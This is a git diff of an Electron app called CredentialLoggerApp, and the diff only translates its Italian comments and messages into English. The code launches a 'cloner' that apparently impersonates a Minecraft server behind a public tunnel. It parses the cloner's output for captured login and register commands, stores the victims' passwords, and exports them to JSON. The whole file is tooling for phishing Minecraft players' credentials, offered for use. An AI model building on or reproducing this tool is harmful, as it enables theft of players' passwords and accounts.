@@ -30,12 +30,12 @@ class CredentialLoggerApp {
 
         this.mainWindow.loadFile('renderer/index.html');
 
-        // Mostra la finestra quando è pronta
+        // Show window when ready
         this.mainWindow.once('ready-to-show', () => {
             this.mainWindow.show();
         });
 
-        // DevTools in modalità dev
+        // DevTools in dev mode
         if (process.argv.includes('--dev')) {
             this.mainWindow.webContents.openDevTools();
         }
@@ -47,7 +47,7 @@ class CredentialLoggerApp {
     }
 
     setupIPCHandlers() {
-        // Controlli finestra
+        // Window controls
         ipcMain.handle('window-minimize', () => {
             this.mainWindow?.minimize();
         });
@@ -65,7 +65,7 @@ class CredentialLoggerApp {
             app.quit();
         });
 
-        // Funzioni del cloner
+        // Cloner functions
         ipcMain.handle('start-cloner', async (event, serverHost, serverPort) => {
             return this.startCloner(serverHost, serverPort);
         });
@@ -109,49 +109,48 @@ class CredentialLoggerApp {
                 const text = data.toString();
                 output += text;
                 
-                // Invia output in tempo reale al renderer
+                // Send output to render
                 this.mainWindow?.webContents.send('cloner-output', text);
 
-                // Estrai URL pubblico
-                const urlMatch = text.match(/📡 INDIRIZZO PUBBLICO: (.+)/);
+                // Extract Public URL
+                const urlMatch = text.match(/📡 PUBLIC IP: (.+)/);
                 if (urlMatch) {
                     publicUrl = urlMatch[1].trim();
                     this.mainWindow?.webContents.send('public-url', publicUrl);
                 }
 
-                // Estrai info server dall'output
-                const versionMatch = text.match(/Versione: (.+)/);
+                // Extract server version
+                const versionMatch = text.match(/Version: (.+)/);
                 if (versionMatch) {
                     this.mainWindow?.webContents.send('server-info-update', {
                         version: versionMatch[1].trim()
                     });
                 }
 
-                const playersMatch = text.match(/Giocatori: (.+)/);
+                const playersMatch = text.match(/Players: (.+)/);
                 if (playersMatch) {
                     this.mainWindow?.webContents.send('server-info-update', {
                         players: playersMatch[1].trim()
                     });
                 }
 
-                // Estrai stato del server
-                if (text.includes('✅ Server rilevato con successo!')) {
+                // Extract server status
+                if (text.includes('✅ Server detected successfully!')) {
                     this.mainWindow?.webContents.send('server-status', 'connected');
                 }
 
-                if (text.includes('🎉 TUNNEL PUBBLICO ATTIVO!')) {
+                if (text.includes('🎉 PUBLIC TUNNEL ACTIVE!')) {
                     this.mainWindow?.webContents.send('tunnel-status', 'active');
                 }
 
-                // Rileva nuove credenziali con pattern multipli
-                if (text.includes('🔥 CREDENZIALE CATTURATA!') || 
-                    text.includes('COMANDO LOGIN:') || 
-                    text.includes('COMANDO REGISTER:') ||
-                    text.includes('📝 COMANDO')) {
+                // Detect new credentials with multiple patterns
+                if (text.includes('🔥 CREDENTIAL CAPTURED!') || 
+                    text.includes('LOGIN COMMAND:') || 
+                    text.includes('REGISTER COMMAND:') ||
+                    text.includes('📝 COMMAND')) {
                     
-                    console.log('🔄 Credenziali aggiornate - notifica al renderer');
+                    console.log('🔄 Credentials updated - notify renderer');
                     
-                    // Notifica immediata + ritardata per essere sicuri
                     this.mainWindow?.webContents.send('credentials-updated');
                     setTimeout(() => {
                         this.mainWindow?.webContents.send('credentials-updated');
@@ -169,7 +168,7 @@ class CredentialLoggerApp {
                 this.clonerProcess = null;
             });
 
-            return { success: true, message: 'Cloner avviato con successo' };
+            return { success: true, message: 'Cloner started successfully' };
 
         } catch (error) {
             return { success: false, message: error.message };
@@ -181,15 +180,15 @@ class CredentialLoggerApp {
             this.clonerProcess.kill('SIGTERM');
             this.clonerProcess = null;
             
-            // Termina anche processi Java
+            // It also kills Java processes
             const killJava = spawn('taskkill', ['/f', '/im', 'java.exe'], { stdio: 'ignore' });
             killJava.on('close', () => {
                 const killJavaw = spawn('taskkill', ['/f', '/im', 'javaw.exe'], { stdio: 'ignore' });
             });
 
-            return { success: true, message: 'Cloner fermato' };
+            return { success: true, message: 'Cloner stopped' };
         }
-        return { success: false, message: 'Nessun processo attivo' };
+        return { success: false, message: 'No active processes' };
     }
 
     async getCredentials() {
@@ -199,10 +198,9 @@ class CredentialLoggerApp {
                 const data = fs.readFileSync(credPath, 'utf8');
                 const rawData = JSON.parse(data);
                 
-                // Se è un array diretto (formato vecchio), convertilo
                 const credentials = Array.isArray(rawData) ? rawData : rawData.credentials || [];
                 
-                // Filtra solo credenziali con password
+                // Filter only credentials with passwords
                 const validCredentials = credentials.filter(cred => 
                     cred.password && (cred.type?.includes('login') || cred.type?.includes('register'))
                 );
@@ -214,7 +212,7 @@ class CredentialLoggerApp {
                 };
                 
                 return { 
-                    credentials: validCredentials.reverse(), // Mostra i più recenti prima
+                    credentials: validCredentials.reverse(), // Show newest first
                     stats 
                 };
             }
@@ -232,7 +230,7 @@ class CredentialLoggerApp {
                 stats: { total: 0, unique_users: 0, connections: 0 }
             };
             fs.writeFileSync(credPath, JSON.stringify(emptyData, null, 2));
-            return { success: true, message: 'Credenziali cancellate' };
+            return { success: true, message: 'Credentials deleted' };
         } catch (error) {
             return { success: false, message: error.message };
         }
@@ -241,7 +239,7 @@ class CredentialLoggerApp {
     async exportCredentials() {
         try {
             const result = await dialog.showSaveDialog(this.mainWindow, {
-                title: 'Esporta Credenziali',
+                title: 'Export Credentials',
                 defaultPath: 'credentials_export.json',
                 filters: [
                     { name: 'JSON Files', extensions: ['json'] },
@@ -252,9 +250,9 @@ class CredentialLoggerApp {
             if (!result.canceled) {
                 const credentials = await this.getCredentials();
                 fs.writeFileSync(result.filePath, JSON.stringify(credentials, null, 2));
-                return { success: true, message: 'Credenziali esportate' };
+                return { success: true, message: 'Credentials exported' };
             }
-            return { success: false, message: 'Esportazione annullata' };
+            return { success: false, message: 'Export canceled' };
         } catch (error) {
             return { success: false, message: error.message };
         }
@@ -263,8 +261,8 @@ class CredentialLoggerApp {
     async getServerInfo(serverHost, serverPort) {
         return new Promise((resolve) => {
             const mc = require('minecraft-protocol');
-            
-            // Usa direttamente minecraft-protocol invece di spawn
+
+            // Use minecraft-protocol directly instead of spawn
             mc.ping({
                 host: serverHost,
                 port: serverPort,
@@ -289,7 +287,7 @@ class CredentialLoggerApp {
     }
 }
 
-// Inizializzazione app
+// App initialization
 const credLoggerApp = new CredentialLoggerApp();
 
 app.whenReady().then(() => {
